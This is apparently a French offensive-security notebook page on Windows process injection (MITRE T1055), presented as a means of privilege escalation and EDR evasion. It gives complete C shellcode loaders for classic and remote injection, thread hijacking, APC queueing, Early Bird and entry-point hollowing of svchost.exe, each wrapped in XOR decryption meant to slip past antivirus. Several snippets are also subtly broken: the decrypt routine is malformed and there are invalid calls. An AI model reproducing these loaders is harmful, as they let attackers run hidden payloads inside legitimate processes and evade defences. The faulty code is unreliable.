 
https://attack.mitre.org/techniques/T1055/

> [!TIP]
> Consiste à injecter du code arbitraire dans l'espace mémoire d'un processus légitime
> Utile pour la privesc et l'évasion d'EDR.

Méthodo :
1. Allouer une nouvelle région de mémoire dans un processus.
2. Copier du shellcode dans cette région.
3. Exécuter le shellcode dans un nouveau thread


- [[#Injection classique]]
- [[#Injection classique à distance]]
- [[#Thread hijacking]]
- [[#Asynchronous Procedure Calls]]
- [[#Early Bird]]
- [[#Process Hollowing]]



# Injection classique

Utilise les APIs VirtualAlloc, WriteProcessMemory et CreateThread afin d'injecter le processus lancé.

```C
#include <Windows.h>

int decrypt(unsigned char shellcode[])
{
	char key[] = "\x4b\x61\x62\x6f\x6f\x6d";
	int i = 0;
	for (i; i < sizeof(shellcode) - 1; i++)
	{
		shellcode[i] = shellcode[i] ^ key;
	}
	return 0;
}

int main()
{
	unsigned char shellcode[] = "..."; // shellcode chiffré en XOR
    decrypt(shellcode);
    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,                       // we don't mind where it's allocated
        sizeof(shellcode),          // the size of memory region
        MEM_COMMIT | MEM_RESERVE,   // type of memory allocation
        PAGE_EXECUTE_READWRITE      // memory protection
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),    // handle to target process
        hMemory,                // pointer to target memory region
        shellcode,             // pointer to data to write
        sizeof(shellcode),      // length of data to write
        &bytesWritten           // receives the number of bytes written
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,  // a pointer to the thing to execute
        NULL,
        0,
        &threadId                         // receives the new thread ID
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,    // the handle to wait on
        INFINITE    // the length of time to wait
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
```

# Injection classique à distance

Permet d'injecter un processus distant en récupérant le process ID.

```C
#include <Windows.h>



decrypt(unsigned char shellcode[]);
{
	char key[] = "\x4b\x61\x62\x6f\x6f\x6d";
	int i = 0;
	for (i; i < sizeof(shellcode) - 1; i++)
	{
		shellcode[i] = shellcode[i] ^ key;
	}
	return 0;
}

int main(int argc, char* argv[]) // argc permet de compter le nb d'arguments passés. argv est un tableau de chaine de caractères qui contient les arguments.
{
	unsigned char shellcode[] = "..."; // shellcode chiffré en XOR
    decrypt(shellcode);
    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    // get handle to process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // desired access level
        FALSE,
        pid                 // target process ID
    );

    // sanity check the handle is valid
    if (hProcess == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,   // handle to target process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateRemoteThread(
        hProcess,   // handle to target process
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,
        NULL,
        0,
        &threadId
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,
        INFINITE
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
```


# Thread hijacking

Consiste à créer un thread dans un état suspendu pointant vers une fonction bégnine, puis changer le contexte du thread afin qu'il pointe vers le shellcode.
Cela permet de bypasser l'inspection de mémoire faite par l'antivirus lors de la création d'un thread.


x64

```C
#include <Windows.h>


decrypt(unsigned char shellcode[]);
{
	char key[] = "\x4b\x61\x62\x6f\x6f\x6d";
	int i = 0;
	for (i; i < sizeof(shellcode) - 1; i++)
	{
		shellcode[i] = shellcode[i] ^ key;
	}
	return 0;
}

void dummy() {
    // do nothing
}

int main()
{
	unsigned char shellcode[] = "..."; // shellcode chiffré en XOR
    decrypt(shellcode);
    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),
        hMemory,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a suspended thread pointing at a dummy function
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)&dummy,
        NULL,
        CREATE_SUSPENDED,
        &threadId
    );

    // little sleep
    Sleep(5 * 1000);

    // get current thread's context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;

    GetThreadContext(hThread, &ctx);

    // point thread context at shellcode
    ctx.Rip = (DWORD64)hMemory;
    SetThreadContext(hThread, &ctx);

    // resume the thread
    ResumeThread(hThread);

    // wait on thread
    WaitForSingleObject(hThread, INFINITE);

    // close handle
    CloseHandle(hThread);
}
```


# Asynchronous Procedure Calls

Similaire au Thread hijacking mais au lieu de créer un nouveau thread, on met en attente une [asynchronous procedure call](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) sur un thread existant. Lorsque ce thread entre dans un état alertable (appel une API comme Sleep ou WaitForSingleObject), le shellcode vers lequel pointe l'APC sera executé. Nécessite l'ID d'un thread (thread walk).

Problème -> Le thread existant nécessite de devenir alertable, ce qui peut ne jamais arriver, autrement dit notre shell code ne sera pas exécuté. La sous technique **Early Bird** permet de contourner le problème.



```C
#include <Windows.h>
#include <tlhelp32.h>



decrypt(unsigned char shellcode[]);
{
	char key[] = "\x4b\x61\x62\x6f\x6f\x6d";
	int i = 0;
	for (i; i < sizeof(shellcode) - 1; i++)
	{
		shellcode[i] = shellcode[i] ^ key;
	}
	return 0;
}

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "..."; // shellcode chiffré en XOR
	decrypt(shellcode);
    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    DWORD threadId = 0;

    // create thread snapshot
    auto hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD,
        0
    );

    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(te);

    // walk the threads
    Thread32First(hSnapshot, &te);

    do {
        if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) {
            if (te.th32OwnerProcessID == pid) {
                // use the first thread we find
                threadId = te.th32ThreadID;
                break;
            }
        }
        te.dwSize = sizeof(te);
    } while (Thread32Next(hSnapshot, &te));

    if (threadId == 0) {
        // we failed to find a thread
        return 0;
    }

    // get a handle to the process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // open handle to target thread
    auto hThread = OpenThread(
        THREAD_ALL_ACCESS,
        FALSE,
        threadId
    );

  	// queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,  // target function
        hThread,            // target thread
        0
    );
}
```


# Early Bird

Contourne le problème de l'APC en créant un nouveau processus dans un état suspendu, puis en mettant en attente l'APC sur le thread principal avant de reprendre le processus suspendu. L'APC sera alors enclenché.

x86

```C
#include <Windows.h>



decrypt(unsigned char shellcode[]);
{
	char key[] = "\x4b\x61\x62\x6f\x6f\x6d";
	int i = 0;
	for (i; i < sizeof(shellcode) - 1; i++)
	{
		shellcode[i] = shellcode[i] ^ key;
	}
	return 0;
}

int main()
{
	unsigned char shellcode[] = "..."; // shellcode chiffré en XOR
	decrypt(shellcode);
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\svchost.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        pi.hProcess,    // handle to newly spawned process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,
        pi.hThread,
        0
    );

    // resume the process
    ResumeThread(pi.hThread);

    // tidy up our handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```


# Process Hollowing

On démarre un processus en état suspendu, le PE original est ensuite désaffecté de la mémoire et remplacé par un PE qui contient notre shellcode.


Une solution intermédiaire est d'écraser le point d'entrée du PE avec le shellcode sans rien désaffecter au préalable. 
Lorsque le processus reprend, son thread principal va pointer vers notre shellcode au lieu de la section de code exécutable du PE.
Cela nécessite d'utiliser l'API [NtQueryInformationProcess](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess) afin d'identifier le point d'entrée du PE lorsqu'il est suspendu. 
Elle permet de populer PROCESS_BASIC_INFORMATION contenant _PebBaseAddress_ qui est un pointeur vers la structure d'une PEB. 
Cette dernière contient _ImageBaseAddres_ (non documenté). 
Il est ensuite possible de lire le DOS header afin d'obtenir la valeur du **e_lfanew** et localiser le NT header pour récupérer la RVA (Relative Virtual Address) du point d'entré du PE présent dans **OptionalHeader->AddressOfEntryPoint**.


```C
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")



int decrypt(unsigned char shellcode[])
{
	char key[] = "\x4b\x61\x62\x6f\x6f\x6d";
	int i = 0;
	for (i; i < sizeof(shellcode) - 1; i++)
	{
		shellcode[i] = shellcode[i] ^ key;
	}
	return 0;
}

int main()
{
	unsigned char shellcode[] = "..."; // shellcode chiffré en XOR
	
	decrypt(shellcode[]);
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\svchost.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // get the process information to find the address of the PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    // the image base address is always at PEB + 0x10 for x64
    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // read the base address (addresses are 8 bytes for x64)
    LPVOID baseAddress = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        lpBaseAddress,
        &baseAddress,
        8,
        &bytesRead
    );

    // now we can read the dos header
    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &dHeader,
        sizeof(dHeader),
        &bytesRead
    );

    // use e_lfanew to calculate pointer to nt header
    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    // read the nt header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );

    // calculate the entry point address
    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // write shellcode to this location, overwriting the PE
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        entryPoint,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // resume the process
    ResumeThread(pi.hThread);
}
```